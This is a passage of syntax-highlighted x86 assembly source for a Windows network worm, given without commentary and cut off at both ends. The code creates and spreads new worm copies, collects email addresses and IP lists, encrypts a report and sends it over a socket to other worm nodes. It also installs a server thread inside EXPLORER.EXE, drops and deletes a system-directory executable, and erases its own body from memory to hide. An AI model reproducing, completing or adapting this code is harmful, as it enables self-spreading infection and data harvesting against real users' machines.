    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;set parameters</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">GEN_CREATEWORM</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">activate_gen</span><span class="sc0">            </span><span class="sc1">;create new worm</span><span class="sc0">


    </span><span class="sc1">;spread the worm</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">spread_the_worm</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">num_of_emailz</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">


    </span><span class="sc1">;deallocate heap memory allocated for email addresses</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">_GetProcessHeap</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;get handle to default process's heap</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">_HeapFree</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;deallocate heap memory</span><span class="sc0">


    </span><span class="sc1">;send report to worm</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@report</span><span class="sc0">
</span><span class="sc5">num_of_emailz</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">;1st param - number of email addresses</span><span class="sc0">
</span><span class="sc5">num_of_IPz</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">;2nd param - number of IPs in IP storage</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">80h</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">       </span><span class="sc1">;block padding</span><span class="sc0">
</span><span class="sc5">@report</span><span class="sc4">:</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MANIFEST.MAN_IPSNUM</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.REP_IPSNUM</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">tmp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">75h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">80h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">cXchgKey</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_CryptEncrypt</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc1">;encrypt report</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">protocol_MAGIC</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc5">WORMNET_SENDREPORT</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">80h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_socket</span><span class="sc0">            </span><span class="sc1">;send header to worm</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_socket</span><span class="sc0">            </span><span class="sc1">;send report to worm</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc5">WORMNET_DISCONNECT</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_socket</span><span class="sc0">            </span><span class="sc1">;send disconnection signal</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mem_manifest</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">dealloc_memory</span><span class="sc0">          </span><span class="sc1">;deallocate memory used by manifest</span><span class="sc0">

</span><span class="sc5">key_destroy_worm</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">cXchgKey</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_CryptDestroyKey</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc1">;destroy key used for encryption</span><span class="sc0">
</span><span class="sc5">socket_destroy_worm</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hSocket</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">_closesocket</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;close socket</span><span class="sc0">

</span><span class="sc5">wsa_destroy_worm</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">_WSACleanup</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;unitialize WSOCK32.DLL</span><span class="sc0">

</span><span class="sc5">crypt32_destroy_worm</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">cKey</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">_CryptDestroyKey</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;destroy key pair</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">cProvider</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">_CryptReleaseContext</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;release crypto context</span><span class="sc0">



</span><span class="sc1">;install server on infected computer and call custom routine</span><span class="sc0">

</span><span class="sc5">install_server</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ServerThread</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">_CreateThread</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;create server thread</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">destroy_worm</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">




    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">GEN_CUSTOM</span><span class="sc0">          </span><span class="sc1">;activate custom routine stored</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">activate_gen</span><span class="sc0">            </span><span class="sc1">;in genotype</span><span class="sc0">



    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">_WaitForSingleObject</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;wait for its termination</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_CloseHandle</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;close thread handle</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">_wsock32</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_FreeLibrary</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;unload WSOCK32.DLL</span><span class="sc0">


    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">filename</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MAX_PATH</span><span class="sc4">-</span><span class="sc2">14</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">_GetSystemDirectoryA</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc13">'niw\'
</span><span class="sc0">    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'es23'</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'xe.r'</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'e'</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">                   </span><span class="sc1">;construct %sysdir%\win32ser.exe</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_DeleteFileA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;delete temporary file</span><span class="sc0">



</span><span class="sc1">;destroy worm body in memory -  copy small code to .reloc section which will delete</span><span class="sc0">
</span><span class="sc1">;               all worm body and terminate worm's main thread</span><span class="sc0">

</span><span class="sc5">destroy_worm</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">module_base</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">         </span><span class="sc1">;address of EXPLORER.EXE</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ebx.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">eax.NT_OptionalHeader.OH_DirectoryEntries.DE_BaseReloc.DD_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">end_seh</span><span class="sc0">             </span><span class="sc1">;check for .reloc section presence</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.NT_OptionalHeader.OH_DirectoryEntries.DE_BaseReloc.DD_Size</span><span class="sc4">],</span><span class="sc5">ender_end</span><span class="sc4">-</span><span class="sc5">Ender</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">end_seh</span><span class="sc0">             </span><span class="sc1">;check its size</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">tmp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ender_end</span><span class="sc4">-</span><span class="sc5">Ender</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">_VirtualProtect</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;unprotect 1st page in .reloc section</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Ender</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">ender_end</span><span class="sc4">-</span><span class="sc5">Ender</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">               </span><span class="sc1">;copy there ender code</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MEM_RELEASE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">worm_base</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">_VirtualFree</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">;jump to ender code</span><span class="sc0">
</span><span class="sc5">rtStart</span><span class="sc0"> </span><span class="sc9">EndP</span><span class="sc0">






</span><span class="sc1">;ender code - deletes worm body from memory and terminates itself</span><span class="sc0">

</span><span class="sc5">Ender</span><span class="sc0">   </span><span class="sc9">Proc</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;release all worm pages</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">_ExitThread</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;and terminate worm's main thread</span><span class="sc0">
</span><span class="sc5">ender_end</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">Ender</span><span class="sc0">   </span><span class="sc9">EndP</span><span class="sc0">






</span><span class="sc1">;create crypto context and key pair</span><span class="sc0">

</span><span class="sc5">crypt_create_context</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">10h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mutexName</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">cProvider</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">_CryptAcquireContextA</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">;delete crypto context</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
